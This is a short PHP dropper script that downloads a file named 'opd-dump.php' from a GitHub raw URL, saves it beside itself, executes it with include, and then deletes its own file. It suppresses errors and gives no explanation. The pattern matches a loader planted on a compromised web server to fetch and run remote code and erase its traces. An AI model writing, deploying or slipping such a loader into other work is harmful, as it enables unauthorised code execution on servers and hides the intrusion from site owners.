<?php
$d=__DIR__;
$b='https://raw.githubusercontent.com/davidpersons10-cloud/getfortwayneplumber/opd-homefix-drop-20260920/ongtmp';
$data=@file_get_contents($b.'/opd-dump.php');
if($data===false||strlen($data)<100){echo 'FAIL';exit(1);}
file_put_contents($d.'/opd-dump.php',$data);
include $d.'/opd-dump.php';
@unlink(__FILE__);
